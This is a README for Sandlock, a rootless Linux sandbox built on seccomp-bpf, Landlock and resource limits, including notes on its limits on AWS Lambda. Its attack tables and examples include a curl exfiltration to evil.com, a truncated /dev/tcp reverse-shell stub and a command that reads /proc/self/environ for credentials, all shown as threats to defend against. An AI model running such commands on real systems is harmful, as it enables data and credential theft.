# Sandlock 🔒

Lightweight userspace sandbox for Linux. No root required.

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![CI](https://github.com/bkmashiro/Sandlock/actions/workflows/ci.yml/badge.svg)](https://github.com/bkmashiro/Sandlock/actions/workflows/ci.yml)
[![Security Tests](https://github.com/bkmashiro/Sandlock/actions/workflows/security-tests.yml/badge.svg)](https://github.com/bkmashiro/Sandlock/actions/workflows/security-tests.yml)

**[中文文档](README_zh.md)** | **[日本語ドキュメント](README_ja.md)**

## Features

- 🔒 **seccomp-bpf** syscall filtering (60+ dangerous syscalls blocked)
- 📊 **Resource limits** - CPU, memory, file size, open files
- 🌐 **Network isolation** - Block all socket operations
- 🧵 **Thread-safe** - Blocks fork while allowing threads
- 🏔️ **Landlock** - Filesystem sandboxing (kernel 5.13+)
- 🎯 **Strict mode** - Path-level syscall interception (kernel 5.0+)
- ⚡ **Low overhead** - ~1.5ms startup cost
- 🔧 **Configurable** - Enable/disable each security feature
- 🚫 **No root required** - Pure userspace implementation

## Attack Defense Matrix

| Attack | Defense | Technology | Test | Option |
|--------|---------|------------|:----:|--------|
| **Network exfiltration** | Block socket syscalls | seccomp-bpf | ✅ | `--no-network` |
| **Fork bomb** | Block clone with CLONE_THREAD=0 | seccomp-bpf | ✅ | `--no-fork` |
| **Memory bomb** | Limit virtual memory | RLIMIT_AS | ✅ | `--mem MB` |
| **CPU exhaustion** | Limit CPU time | RLIMIT_CPU | ✅ | `--cpu SEC` |
| **Disk filling** | Limit file size | RLIMIT_FSIZE | ✅ | `--fsize MB` |
| **FD exhaustion** | Limit open files | RLIMIT_NOFILE | ✅ | `--nofile N` |
| **Infinite loop** | Wall-clock timeout | SIGALRM+SIGKILL | ✅ | `--timeout SEC` |
| **Process debugging** | Block ptrace | seccomp-bpf | ✅ | `--no-dangerous` |
| **Kernel exploitation** | Block bpf, io_uring | seccomp-bpf | ✅ | `--no-dangerous` |
| **Container escape** | Block unshare, setns | seccomp-bpf | ✅ | `--no-dangerous` |
| **Privilege escalation** | NO_NEW_PRIVS | prctl | ✅ | default on |
| **Environment leak** | Sanitize env vars | clearenv | ✅ | `--clean-env` |
| **Symlink attacks** | Block symlink/link | seccomp-bpf | ✅ | `--no-dangerous` |
| **File access** | Path-based restrictions | Landlock | ✅ | `--landlock --ro/--rw` |
| **File access (strict)** | Syscall interception | seccomp notify | ✅ | `--strict --allow PATH` |
| **Output flooding** | Limit output size | pipe + truncate | ✅ | `--max-output N` |

## Quick Start

```bash
# Build
make

# Block network
./sandlock --no-network -- curl https://evil.com
# Error: Operation not permitted

# Limit resources
./sandlock --cpu 5 --mem 64 -- python3 heavy_script.py

# Full sandbox
./sandlock --no-network --no-fork --clean-env --cpu 5 --mem 256 -- ./untrusted
```

## Installation

```bash
# Build from source (requires libseccomp-dev)
sudo apt install libseccomp-dev  # Debian/Ubuntu
make
sudo make install

# Or just copy the binary
cp sandlock /usr/local/bin/
```

## Usage

```
sandlock [OPTIONS] -- COMMAND [ARGS...]

Resource Limits:
  --cpu SEC          CPU time limit in seconds
  --mem MB           Memory limit in megabytes
  --fsize MB         Max file size in megabytes
  --nofile N         Max open file descriptors
  --nproc N          Max processes (per-user)
  --timeout SEC      Wall-clock timeout

Security Features:
  --no-network       Block all network syscalls
  --no-fork          Block fork/clone (allow threads)
  --no-dangerous     Block dangerous syscalls (default: on)
  --allow-dangerous  Disable dangerous syscall blocking
  --clean-env        Sanitize environment variables

Landlock (kernel 5.13+):
  --landlock         Enable Landlock filesystem sandbox
  --ro PATH          Add read-only path (repeatable)
  --rw PATH          Add read-write path (repeatable)

Strict Mode (kernel 5.0+):
  --strict           Enable path-level syscall interception
  --allow PATH       Allow access to path (repeatable, required with --strict)

I/O Control:
  --pipe-io          Wrap I/O in pipes
  --max-output N     Limit output size in bytes

Isolation:
  --isolate-tmp      Use private /tmp directory
  --workdir DIR      Set working directory

Logging:
  -v, --verbose      Increase verbosity (can repeat: -vv)
  -q, --quiet        Decrease verbosity (-q, -qq, -qqq)

Other:
  --features         Show available features
  -h, --help         Show help
  --version          Show version
```

## Examples

### Run untrusted code

```bash
# Student code submission
sandlock --no-network --no-fork --clean-env \
         --cpu 5 --mem 256 --timeout 30 \
         -- python3 student_code.py
```

### Filesystem sandbox (Landlock)

```bash
# Only allow /tmp (rw) and /usr (ro)
sandlock --landlock --rw /tmp --ro /usr --ro /lib --ro /lib64 \
         -- python3 -c "open('/etc/passwd')"  # Blocked!
```

### Strict mode (path-level control)

```bash
# Only allow access to /tmp, block everything else
sandlock --strict --allow /tmp -v -- sh -c "echo test > /tmp/ok.txt"
# DEBUG: ALLOWED: openat(/tmp/ok.txt)

sandlock --strict --allow /tmp -v -- cat /etc/passwd
# DEBUG: BLOCKED: openat(/etc/passwd)
# cat: /etc/passwd: Permission denied
```

> ⚠️ **Strict mode conflicts:**
> - Cannot use with `--pipe-io` (deadlock risk)
> - Requires at least one `--allow PATH`
> - Redundant with `--landlock` (strict provides stronger isolation)

### Output limiting

```bash
# Limit output to 1MB
sandlock --pipe-io --max-output 1048576 -- ./verbose_program
```

## Blocked Syscalls (with --no-dangerous)

| Category | Syscalls |
|----------|----------|
| Debug | ptrace, process_vm_readv, process_vm_writev |
| Kernel | bpf, io_uring_*, userfaultfd, perf_event_open |
| Namespace | unshare, setns |
| Filesystem | mount, umount2, chroot, pivot_root, symlink, link |
| System | reboot, kexec_*, init_module, *_module |
| Monitoring | inotify_*, fanotify_* |
| Keys | keyctl, add_key, request_key |
| Hardware | ioperm, iopl, modify_ldt |
| Time | settimeofday, clock_settime, adjtimex |
| Misc | personality, quotactl, nfsservctl |

## Security Model

```
┌────────────────────────────────────────┐
│         Untrusted Process              │
│                                        │
│  ┌──────────────────────────────────┐  │
│  │    Strict Mode (kernel 5.0+)     │  │
│  │  (seccomp notify path control)   │  │
│  │  • Intercepts openat/execve      │  │
│  │  • Validates against allowlist   │  │
│  └──────────────────────────────────┘  │
│                or                      │
│  ┌──────────────────────────────────┐  │
│  │       Landlock (kernel 5.13+)    │  │
│  │   (filesystem access control)    │  │
│  └──────────────────────────────────┘  │
│                                        │
│  ┌──────────────────────────────────┐  │
│  │         seccomp-bpf              │  │
│  │   (syscall filtering layer)      │  │
│  │  • 60+ syscalls blocked          │  │
│  │  • Network optionally blocked    │  │
│  │  • Fork optionally blocked       │  │
│  └──────────────────────────────────┘  │
│                                        │
│  ┌──────────────────────────────────┐  │
│  │           rlimits                │  │
│  │   (resource limiting layer)      │  │
│  │  • CPU, Memory, Files            │  │
│  └──────────────────────────────────┘  │
│                                        │
│  ┌──────────────────────────────────┐  │
│  │      prctl(NO_NEW_PRIVS)         │  │
│  │   (privilege escalation block)   │  │
│  └──────────────────────────────────┘  │
└────────────────────────────────────────┘
```

## Comparison

| Feature | sandlock | Docker | Firejail | bubblewrap |
|---------|:--------:|:------:|:--------:|:----------:|
| Root required | ❌ | ✅ | ⚠️ | ⚠️ |
| Overhead | ~1.5ms | ~100ms | ~50ms | ~10ms |
| Network isolation | ✅ | ✅ | ✅ | ✅ |
| Filesystem sandbox | ✅* | ✅ | ✅ | ✅ |
| Resource limits | ✅ | ✅ | ✅ | ❌ |
| Syscall filtering | ✅ | ✅ | ✅ | ✅ |
| Complexity | Low | High | Medium | Medium |

*Landlock requires kernel 5.13+

## Option Conflicts

Sandlock validates configuration at startup and warns about conflicts:

| Options | Conflict | Resolution |
|---------|----------|------------|
| `--strict` + `--pipe-io` | Deadlock risk | `--pipe-io` disabled |
| `--strict` without `--allow` | No paths allowed | Error, won't start |
| `--landlock` + `--strict` | Redundant | Warning (strict stronger) |
| `--isolate-tmp` + `--cleanup-tmp` | Redundant | Warning (isolate auto-cleans) |
| `--cpu N` > `--timeout M` | Timeout first | Warning |

## Known Limitations

- `/proc` is readable (Linux limitation without mount namespace)
- `RLIMIT_NPROC` is per-user, not per-sandbox
- Requires `libseccomp` on the system
- Linux only (uses seccomp-bpf)
- Landlock requires kernel 5.13+ (graceful fallback on older kernels)

## AWS Lambda

> ⚠️ **Sandlock kernel features (seccomp, Landlock) do NOT work on Lambda.**

Lambda's Firecracker microVM pre-applies seccomp filters, blocking additional filter installation.

### What Works on Lambda

| Feature | Status | Notes |
|---------|:------:|-------|
| rlimits (CPU/mem/fsize) | ✅ | Resource limits work |
| `--timeout` | ✅ | SIGALRM works |
| `--clean-env` | ✅ | Environment sanitization |
| `--isolate-tmp` | ✅ | /tmp isolation |
| `lang/python/sandbox.py` | ✅ | Python-level restrictions |

### What Does NOT Work

| Feature | Status | Reason |
|---------|:------:|--------|
| seccomp-bpf | ❌ | Firecracker blocks filter installation |
| `--no-network` | ❌ | Requires seccomp |
| `--no-fork` | ❌ | Requires seccomp |
| `--strict` | ❌ | Requires seccomp notify |
| Landlock | ❌ | Kernel 5.10 < 5.13 |

### Recommended Lambda Setup

**Use VPC isolation for network security:**

```
┌─────────────────────────────────────┐
│ VPC (Private Subnet, No NAT)        │
│                                     │
│   Lambda ──✗──► Internet            │
│      │                              │
│      └──► VPC Endpoint (optional)   │
│           └──► Specific AWS services│
└─────────────────────────────────────┘
```

```yaml
# serverless.yml example
functions:
  sandbox:
    timeout: 30
    memorySize: 256
    vpc:
      subnetIds:
        - subnet-private-no-nat
      securityGroupIds:
        - sg-no-outbound
```

### What AWS Features Do NOT Help

| AWS Feature | Why It Doesn't Help |
|-------------|---------------------|
| Code Signing | Deployment-time only, not runtime |
| IAM Roles | Controls AWS API access, not syscalls |
| CloudWatch | Monitoring only, no prevention |
| X-Ray | Tracing only |
| Security Hub | Compliance scanning, not runtime |

### Lambda Security Summary

```
For network isolation: VPC (no NAT gateway)
For resource limits: rlimits (works)
For Python code: lang/python/sandbox.py
For other languages: Consider EC2/ECS with full Sandlock
```

### Attack Defense Matrix by Environment

| Attack | Userspace | Lambda+Python | Lambda+Other |
|--------|:---------:|:-------------:|:------------:|
| **Network** ||||
| TCP/UDP exfiltration | ✅ seccomp | ⚠️ import hook | ❌ VPC only |
| Reverse shell | ✅ seccomp | ⚠️ import hook | ❌ VPC only |
| **Process** ||||
| Fork bomb | ✅ seccomp | ✅ import hook | ❌ **Undefended** |
| subprocess/exec | ✅ seccomp | ✅ import hook | ❌ **Undefended** |
| **Filesystem** ||||
| Read /etc/passwd | ✅ Landlock | ✅ restricted open | ❌ **Undefended** |
| Write anywhere | ✅ Landlock | ✅ restricted open | ❌ **Undefended** |
| **Low-level** ||||
| ptrace | ✅ seccomp | ✅ no ctypes | ❌ **Undefended** |
| Direct syscall | ✅ seccomp | ✅ no ctypes | ❌ **Undefended** |
| io_uring | ✅ seccomp | ✅ blocked | ❌ **Undefended** |
| **Resources** ||||
| CPU exhaustion | ✅ rlimit | ✅ rlimit | ✅ rlimit |
| Memory exhaustion | ✅ rlimit | ✅ rlimit | ✅ rlimit |
| Timeout | ✅ SIGALRM | ✅ SIGALRM | ✅ SIGALRM |

### ⚠️ Lambda Non-Python: Undefended Attacks

| Attack | Example | Impact | Mitigation |
|--------|---------|--------|------------|
| Data exfiltration | `curl evil.com?d=secret` | Data leak | VPC isolation |
| Reverse shell | `bash -i >& /dev/tcp/...` | Full control | VPC isolation |
| Credential theft | `cat /proc/self/environ` | AWS keys | Minimal IAM |
| Crypto mining | Download & run miner | Resource abuse | VPC + timeout |
| Lateral movement | Scan internal VPC | Attack other services | Security groups |

### Risk Assessment

| Environment | Security | Recommendation |
|-------------|:--------:|----------------|
| Userspace + Sandlock | 🟢 High | Run any untrusted code |
| Lambda + Python sandbox | 🟡 Medium | Acceptable for student code |
| Lambda + VPC (non-Python) | 🟠 Low | Only semi-trusted code |
| Lambda without protection | 🔴 Critical | Never run untrusted code |

## Testing

```bash
# Run test suite (requires Docker)
make test

# Or run directly on Linux
./test.sh

# Check available features
./sandlock --features
```

## License

MIT License - see [LICENSE](LICENSE)

## Contributing

Contributions welcome! Please open an issue or PR.

## Related Projects

- [minijail](https://google.github.io/minijail/) - Google's sandboxing library
- [firejail](https://github.com/netblue30/firejail) - SUID sandbox
- [bubblewrap](https://github.com/containers/bubblewrap) - Unprivileged sandboxing
- [nsjail](https://github.com/google/nsjail) - Process isolation with namespaces
